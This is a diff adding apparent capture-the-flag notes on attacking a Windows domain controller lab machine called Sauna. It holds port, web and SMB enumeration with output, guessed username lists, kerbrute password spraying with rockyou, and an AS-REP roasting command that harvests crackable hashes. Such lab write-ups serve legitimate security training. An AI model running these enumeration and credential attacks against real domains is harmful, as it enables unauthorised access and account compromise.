@@ -1,0 +1,253 @@
+# port scans 
+#basic 
+
+nmap -Pn 10.10.10.175
+
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-15 21:31 EST
+Nmap scan report for 10.10.10.175
+Host is up (0.097s latency).
+Not shown: 988 filtered ports
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap done: 1 IP address (1 host up) scanned in 17.72 seconds
+
+# full scan
+
+nmap -sC -sV -Pn -p- 10.10.10.175
+
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-16 10:59:13Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  msrpc         Microsoft Windows RPC
+64562/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.70%I=7%D=2/15%Time=5E48AFB1%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8h01m24s, deviation: 0s, median: 8h01m24s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-02-16 06:01:33
+|_  start_date: N/A
+
+
+
+# port 80
+
+
+http://10.10.10.175/
+
+# contains a banks site 
+# go to any of the blog pages
+
+http://10.10.10.175/single.html
+
+# trying dearch we get an error:
+
+405 - HTTP verb used to access this page is not allowed.
+
+# can we send it with another verb to burp?
+
+# some scans in the background 
+
+nikto -h 10.10.10.175
+
++ Server: Microsoft-IIS/10.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ 7863 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2020-02-15 22:34:36 (GMT-5) (803 seconds)
+
+
+gobuster -w /usr/share/wordlists/dirb/common.txt -t 30 -x html,asp,php -u http://10.10.10.175 -o gobuster.txt
+
+
+/About.html (Status: 200)000000000000
+/about.html (Status: 200)
+/blog.html (Status: 200)
+/Blog.html (Status: 200)
+/Contact.html (Status: 200)
+/contact.html (Status: 200)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/Index.html (Status: 200)
+/Images (Status: 301)
+/single.html (Status: 200)
+
+# goes back the same page with a GET and HEAD instaead of a post 
+# try to gtather mor eusernames with CEWL
+
+cewl -d 5 http://10.10.10.175 -w cewl.txt
+
+http://10.10.10.175/about.html
+
+# found more users
+
+Fergus Smith
+Shaun Coins 
+Sophie Driver 
+Bowie Taylor 
+Hugo Bear
+Steven Kerb
+
+# try to make different combinations 
+
+Fergus.Smith
+Shaun.Coins 
+Sophie.Driver 
+Bowie.Taylor 
+Hugo.Bear 
+Steven.Kerb 
+
+F.Smith
+S.Coins
+S.Driver
+B.Taylor
+H.Bear
+S.Kerb
+
+
+
+## Port 139 SMB
+
+smbclient -L 10.10.10.175 -U "" -N
+
+do_connect: Connection to 10.10.10.175 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+smbclient -L 10.10.10.175 -U "guest"%
+session setup failed: NT_STATUS_ACCOUNT_DISABLED
+
+# no go lets enum
+
+enum4linux -a 10.10.10.175 | tee enum4linux.txt
+
+# NT_STATUS_ACCESS_DENIED for everything 
+
+nmap -script=smb-vuln* -sV -Pn -p 139,445 --open 10.10.10.175
+# nothing 
+
+nmap -script=smb-vuln* -sV -Pn -p 139,445 --open 10.10.10.175 --script-args=unsafe
+#nothing 
+
+
+# POrt 80
+
+# found usernames on the website: Watson, Johnson, and Jane
+# try kerbrute
+
+python /opt/kerbrute.py -domain EGOTISTICAL-BANK.LOCAL -dc-ip 10.10.10.175 -users users.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile sauna_passwords.txt
+
+# timed out 
+# try the users without a password
+
+smbclient -L 10.10.10.175 -U Watson -N 
+smbclient -L 10.10.10.175 -U Doe -N
+smbclient -L 10.10.10.175 -U Johnson -N 
+smbclient -L 10.10.10.175 -U Admin -N
+smbclient -L 10.10.10.175 -U James -N
+
+smbclient -L 10.10.10.175 -U Steven.Kerb -N
+smbclient -L 10.10.10.175 -U Hugo.Bear -N
+smbclient -L 10.10.10.175 -U Bowie.Taylor -N
+smbclient -L 10.10.10.175 -U Sophie.Driver -N
+smbclient -L 10.10.10.175 -U Shaun.Coins -N
+smbclient -L 10.10.10.175 -U Fergus.Smith -N
+
+smbclient -L 10.10.10.175 -U S.Kerb -N
+smbclient -L 10.10.10.175 -U H.Bear -N
+smbclient -L 10.10.10.175 -U B.Taylor -N
+smbclient -L 10.10.10.175 -U S.Driver -N
+smbclient -L 10.10.10.175 -U S.Coins -N
+smbclient -L 10.10.10.175 -U F.Smith -N
+
+Fergus.Smith
+Shaun.Coins
+Sophie.Driver
+Bowie.Taylor
+Hugo.Bear
+Steven.Kerb
+
+F.Smith
+S.Coins
+S.Driver
+B.Taylor
+H.Bear
+S.Kerb
+
+sauna?
+
+
+# try username as password
+
+# try to gather 
+
+
+
+
+# Port 88 Kerberos 
+
+nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’EGOTISTICAL-BANK.LOCAL’,userdb=users.txt 10.10.10.175
+
+nmap -Pn -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=’EGOTISTICAL-BANK.LOCAL’,userdb=users.txt 10.10.10.175
+
+msf > use Auxiliary/gather/Kerberos_enumusers
+set DOMAIN <DOMAIN>
+set RHOSTS <IP_ADDRESS>
+set USER_FILE <USERS_FILE>
+
+# none of these worked with the current list 
+
+python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile users.txt -format john -outputfile sauna_hashes.txt
